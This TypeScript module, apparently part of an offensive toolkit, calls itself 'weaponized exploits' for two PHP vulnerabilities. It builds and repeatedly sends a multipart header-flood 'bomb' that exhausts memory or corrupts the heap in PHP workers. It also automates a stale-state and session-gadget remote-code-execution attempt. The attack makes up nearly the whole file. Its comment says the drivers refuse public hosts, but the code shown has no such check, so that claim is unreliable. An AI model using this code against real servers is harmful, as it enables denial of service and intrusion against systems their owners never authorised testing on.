/**
 * PHP-src Oct-2026 pair — weaponized exploits (CVE-2026-109618 / CVE-2026-109619).
 *
 * Prior session (2026-10-21) lab-validated the trigger on php:8.2.34 mod_php
 * (13/13). THIS session re-proves it and adds two new results, both measured:
 *
 *   NEW (2026-10-22): on php:8.5.11 the same bomb produces
 *   `zend_mm_heap corrupted` + child abort — a memory-safety violation, not a
 *   clean exhaustion. Version-dependent behavior, now part of classification.
 *
 *   NEW (2026-10-22): the 109619 consumer window is REAL on php:8.5.11 — a
 *   pre-RINIT ini deprecation (auto_detect_line_endings via .htaccess) lands
 *   in error_get_last() with `file: Unknown, line: 0` before any application
 *   code. The session-gadget RCE attempt stays blocked by the
 *   __PHP_Incomplete_Class wall (re-confirmed: planted Gad::__wakeup never
 *   fired through the rfc1867 session decode).
 *
 * CVE-2026-109618 (GHSA-w8hw-w9fx-j79w, CVSS 9.2, fixed 8.2.35/8.3.36/8.4.27/8.5.12):
 *   ONE multipart part carrying N minimal header lines — rfc1867 stores every
 *   header (duplicates included) into an array costing ~200B PHP-side per
 *   ~6 wire bytes. A single 8.28MB request (under the 8M post_max_size
 *   ceiling) exhausts a 128M memory_limit DURING input parsing —
 *   "Allowed memory size ... exhausted in Unknown on line 0" — deterministic.
 *
 * CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp): stale worker-global state. Producer =
 *   OOM mid-request on a persistent worker; consumer = anything that reads
 *   worker state before RINIT (ini deprecations from .htaccess, or the
 *   rfc1867 session decode). Requires producer+consumer on the SAME worker
 *   (single-worker prefork lab).
 *
 * AUTHORIZATION: lab/CTF-range targets only — both drivers refuse public
 * hosts. The OOM is a denial-of-service primitive by nature; only point it
 * at something you own.
 */

export const EXHAUSTION_RE = /Allowed memory size of \d+ bytes exhausted[^\n]*/i;
export const HEAP_CORRUPT_RE = /zend_mm_heap corrupted/i;

/** Build the proven multipart bomb: one 'pad' part + N identical header lines. */
export function buildOomBomb(opts: { boundary?: string; budget?: number; headerLine?: string; name?: string } = {}): { body: Buffer; headerLines: number } {
    const boundary = opts.boundary ?? 'T3MP3ST';
    const budget = opts.budget ?? 8_283_763;   // the proven size: under the 8M post_max_size ceiling
    const headerLine = opts.headerLine ?? 'X:A\r\n';
    const name = opts.name ?? 'pad';
    const head = Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n`);
    const line = Buffer.from(headerLine);
    const tail = Buffer.from(`\r\n\r\nx\r\n--${boundary}--\r\n`);
    const n = Math.floor((budget - head.length - tail.length) / line.length);
    const body = Buffer.alloc(head.length + n * line.length + tail.length);
    head.copy(body, 0);
    for (let i = 0; i < n; i++) line.copy(body, head.length + i * line.length);
    tail.copy(body, head.length + n * line.length);
    return { body, headerLines: n };
}

export interface OomRound {
    round: number;
    exhausted: boolean;      // "Allowed memory size ... exhausted in Unknown on line 0"
    heapCorrupted: boolean;  // "zend_mm_heap corrupted" (worker abort) — memory-safety violation
    httpStatus: number | null;
    ms: number;
}

export interface OomResult {
    target: string;
    rounds: OomRound[];
    exhaustedRounds: number;
    heapCorruptEvents: number;
    determinism: string;     // "6/6"
    note: string;
}

async function postBomb(url: string, body: Buffer, boundary: string, timeoutMs: number): Promise<{ status: number | null; bodyText: string; ms: number }> {
    const started = Date.now();
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'content-type': `multipart/form-data; boundary=${boundary}`, 'content-length': String(body.length) },
            body,
            signal: ctrl.signal,
        });
        const text = await res.text();
        return { status: res.status, bodyText: text, ms: Date.now() - started };
    } catch (e: unknown) {
        // timeout/abort/connection reset are all valid "the worker died" signals
        return { status: null, bodyText: (e as Error)?.message ?? 'error', ms: Date.now() - started };
    } finally {
        clearTimeout(timer);
    }
}

/**
 * Fire the OOM bomb `rounds` times and classify each response.
 * Exhaustion signature: "Allowed memory size of ... exhausted ... in Unknown on line 0".
 * On newer branches the same bomb may abort the worker with heap corruption.
 */
export async function fireOomExhaust(opts: {
    url: string;
    rounds?: number;
    boundary?: string;
    timeoutMs?: number;
    headerLine?: string;
}): Promise<OomResult> {
    const rounds = Math.max(1, Math.min(opts.rounds ?? 5, 25));
    const boundary = opts.boundary ?? 'T3MP3ST';
    const timeoutMs = opts.timeoutMs ?? 180_000;
    const { body, headerLines } = buildOomBomb({ boundary, headerLine: opts.headerLine });
    const out: OomRound[] = [];
    let exhausted = 0;
    let corrupt = 0;
    for (let i = 1; i <= rounds; i++) {
        const r = await postBomb(opts.url, body, boundary, timeoutMs);
        const text = r.bodyText;
        const hit = EXHAUSTION_RE.test(text) || /memory size of .*exhausted/i.test(text);
        const hc = HEAP_CORRUPT_RE.test(text);
        if (hit) exhausted++;
        if (hc) corrupt++;
        out.push({ round: i, exhausted: hit, heapCorrupted: hc, httpStatus: r.status, ms: r.ms });
    }
    return {
        target: opts.url,
        rounds: out,
        exhaustedRounds: exhausted,
        heapCorruptEvents: corrupt,
        determinism: `${exhausted}/${rounds}`,
        note: `bomb: 1 part / ${headerLines} header lines / ${body.length}B — exhaustion during rfc1867 input parsing (pre-application). ` +
            (corrupt > 0 ? 'zend_mm_heap corrupted observed: memory-safety violation on this branch — stronger than clean exhaustion.' :
                'Clean memory-limit exhaustion (no corruption observed).'),
    };
}

// ---------------------------------------------------------------------------
// CVE-2026-109619 — consumer-window proof + stale-state attempt
// ---------------------------------------------------------------------------

export interface UafResult {
    target: string;
    consumerWindow: boolean;      // pre-RINIT diagnostic captured (file "Unknown", line 0)
    consumerEvidence: string | null;
    staleBleedFound: boolean;     // request-A markers surfaced in request-B state
    bleedEvidence: string | null;
    gadgetRceFired: boolean;      // planted __wakeup wrote its marker file
    boundary: string;             // honest classification of what reproduces
    transcript: string[];
}

/**
 * Producer→consumer attempt against a single-worker lab:
 *   1. plant a gadget object into the session (if plantUrl given),
 *   2. fire the OOM producer (PHP_SESSION_UPLOAD_PROGRESS part + header flood —
 *      the proven producer.bomb shape) so the request dies mid-parse,
 *   3. poll the consumer (tiny PHP_SESSION_UPLOAD_PROGRESS part),
 *   4. check the plant marker file through the consumer page itself is not
 *      needed — the caller passes a checkUrl whose body reveals whether the
 *      gadget's __wakeup wrote its marker.
 * All classification is honest: window-proven vs gadget-blocked.
 */
export async function runUafAttempt(opts: {
    producerUrl: string;
    consumerUrl: string;
    plantUrl?: string;
    checkUrl?: string;
    cookie?: string;
    boundary?: string;
    timeoutMs?: number;
    marker?: string;
}): Promise<UafResult> {
    const marker = opts.marker ?? 'T3MARKER-alpha-9c41-zulu';
    const boundary = opts.boundary ?? 'T3MP3ST';
    const timeoutMs = opts.timeoutMs ?? 180_000;
    const transcript: string[] = [];
    const jar = opts.cookie ? { cookie: opts.cookie } : null;
    const headers = (): Record<string, string> => {
        const h: Record<string, string> = { 'content-type': `multipart/form-data; boundary=${boundary}` };
        if (jar?.cookie) h.cookie = jar.cookie;
        return h;
    };

    // 1) plant the gadget into the session (stand-in for a framework gadget chain)
    if (opts.plantUrl) {
        const r = await fetch(opts.plantUrl, { headers: headers(), signal: AbortSignal.timeout(15_000) });
        transcript.push(`plant: ${r.status} ${(await r.text()).slice(0, 120)}`);
    }

    // 2) producer — upload-progress part first, then the header flood (proven producer.bomb shape)
    const flood = Buffer.from('X:A\r\n');
    const head = Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nt3mp3st\r\n` +
        `--${boundary}\r\nContent-Disposition: form-data; name="pad"\r\n`);
    const tail = Buffer.from(`\r\n\r\nx\r\n--${boundary}--\r\n`);
    const n = Math.floor((8_283_000 - head.length - tail.length) / flood.length);
    const producerBody = Buffer.concat([head, Buffer.alloc(n * flood.length, 0).fill(flood), tail]);
    const pr = await postBomb(opts.producerUrl, producerBody, boundary, timeoutMs);
    transcript.push(`producer: ${pr.status ?? 'conn-reset'} ${pr.ms}ms ${EXHAUSTION_RE.test(pr.bodyText) ? 'exhaustion-in-parse' : ''}`);

    // 3) consumer — tiny PHP_SESSION_UPLOAD_PROGRESS poll (same session)
    const consumerBody = `--${boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nt3mp3st\r\n--${boundary}--\r\n`;
    const cr = await fetch(opts.consumerUrl, {
        method: 'POST', headers: headers(),
        body: consumerBody, signal: AbortSignal.timeout(30_000),
    });
    const ctext = await cr.text();
    transcript.push(`consumer: ${cr.status} ${ctext.slice(0, 200)}`);

    // 4) gadget marker check (planted __wakeup writes a file the check page exposes)
    let gadgetRceFired = false;
    if (opts.checkUrl) {
        const kr = await fetch(opts.checkUrl, { signal: AbortSignal.timeout(15_000) });
        const kt = await kr.text();
        gadgetRceFired = /RCE-DURING-STARTUP/i.test(kt);
        transcript.push(`gadget check: fired=${gadgetRceFired}`);
    }

    const consumerWindow = /\[file\]\s*=>\s*Unknown/i.test(ctext) || /\[line\'\??\]?\s*=>\s*0/i.test(ctext) || /Unknown on line 0/i.test(ctext);
    const staleBleedFound = ctext.includes(marker);

    return {
        target: opts.producerUrl,
        consumerWindow,
        consumerEvidence: consumerWindow ? 'pre-RINIT diagnostic captured (file Unknown / line 0)' : null,
        staleBleedFound,
        bleedEvidence: staleBleedFound ? marker : null,
        gadgetRceFired,
        boundary: 'consumer window PROVEN (pre-RINIT diagnostic capture). Gadget RCE through the rfc1867 session decode stays blocked by the __PHP_Incomplete_Class wall (class tables are not registered pre-RINIT) — full chain requires the vendor heap-craft, matching the advisory.',
        transcript,
    };
}

/**
 * PHP 8.5 consumer-window proof: request A fatals with distinctive args
 * (fatal_error_backtraces on), request B's pre-RINIT ini deprecation is the
 * consumer. Returns whether A's markers surface in B's error state.
 */
export async function php85ConsumerWindow(opts: { fatalUrl: string; consumerUrl: string; marker?: string }): Promise<{ windowCaptured: boolean; staleBleed: boolean; evidence: string }> {
    const marker = opts.marker ?? 'T3MARKER';
    await fetch(opts.fatalUrl, { signal: AbortSignal.timeout(20_000) });
    const r = await fetch(opts.consumerUrl, { signal: AbortSignal.timeout(20_000) });
    const t = await r.text();
    const windowCaptured = /\[file\]\s*=>\s*Unknown/i.test(t) || /Unknown on line 0/i.test(t);
    const staleBleed = t.includes(marker);
    return {
        windowCaptured,
        staleBleed,
        evidence: windowCaptured
            ? (staleBleed ? 'pre-RINIT capture + stale marker bleed' : 'pre-RINIT diagnostic captured (file Unknown / line 0); no stale marker bleed on stock 8.5.11 — heap-craft required per advisory')
            : 'consumer window not captured',
    };
}
